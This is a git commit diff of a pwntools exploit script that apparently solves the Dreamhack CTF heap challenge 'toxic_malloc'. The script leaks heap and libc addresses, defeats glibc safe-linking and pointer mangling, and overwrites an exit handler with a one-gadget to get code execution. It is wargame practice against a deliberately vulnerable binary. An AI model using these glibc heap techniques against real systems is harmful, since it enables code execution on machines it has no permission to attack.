4332128ccc466457906efe10767b97afd13054c0
Brian Lee <hibrian827@gmail.com>
2025-08-13 03:28:11 +0900

    solving toxic malloc

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,18 +1,10 @@
 from pwn import *
 
-# context.log_level = 'debug'
+context.log_level = 'warn'
 context.terminal = ['tmux', 'new-window']
 
-ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
-env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
-rem = process([ld, "./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
-# port = 18595
-# rem = remote("host3.dreamhack.games", port)
-
-lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")
-
 def safe_link(pos, ptr):
-  return (pos >> 12) ^ ptr
+      return (pos >> 12) ^ ptr
 
 def decrypt_safe_linking(ptr):
   _12bits = []
@@ -54,6 +46,14 @@ def delete(idx):
 def exit():
   rem.sendlineafter(b'choice:', b"5")
 
+# ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
+# env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
+# rem = process([ld, "./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
+
+port = 31337
+rem = remote("0.0.0.0", port)
+
+lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")
 
 create(0, b'A' * 8)
 create(1, b'A' * 8)
@@ -62,7 +62,7 @@ delete(0)
 update(0, p64(0) * 2)
 delete(0)
 heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0
-print(hex(heap_base))
+# print(hex(heap_base))
 
 
 for i in range(1, 7):
@@ -71,54 +71,27 @@ for i in range(1, 7):
 
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
 initial = lib_base + 0x21bf00
-dl_fini_addr = lib_base + 0x256040
+dl_fini_addr = lib_base + 0x0
 gadget_addr = lib_base + 0xebc81
 
 print(hex(lib_base))
 print(hex(initial))
 print(hex(gadget_addr))
 
-# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-# create(2, p64(safe_link(heap_base+0x2a0, initial)))
-# create(3, b"B" * 16)
-# payload = b"C" * 0x18
-# create(4, payload)
+update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+create(2, p64(safe_link(heap_base+0x2a0, initial)))
+create(3, b"B" * 16)
+payload = b"C" * 0x18
+create(4, payload)
 
-# mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
-# pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
-# print(hex(pointer_gaurd))
-gdb.attach(rem)
+mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
+pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
+print(hex(pointer_gaurd))
 # print(p64(rol(gadget_addr, 0x11, word_size=64)))
-# update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64)))
-
-# delete(1)
-# update(1, p64(1) * 2)
-# delete(1)
-# update(1, p64(initial + 0x18))
-
-# create(3, b"A" * 8)
-
-
-# print(read(1))
-
-# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-# create(2, p64(safe_link(heap_base+0x2a0, fs_base+0x30)))
-# create(3, b"A" * 16)
-# create(4, p64(0) * 2)
-
-
-# delete(4)
-# update(4, b"B" * 16)
-# create(4, p64(safe_link(heap_base+0x2a0, exit_funcs-8)))
-# create(4, p64(fake_exit_function_list)*2)
-
-# create(0, p64(1) + p64(4)) # idx, flavor
-# create(1, p64(rol(lib_base+lib.symbols['system'], 0x11, word_size=64)) + p64(heap_base + 0x2a0))
-
-# create(2, b'/bin/sh')
+update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64) ^ pointer_gaurd))
 
 exit()
 
-# print(rem.recvline())
+rem.recvline()
 
-rem.interactive()
+# rem.interactive()
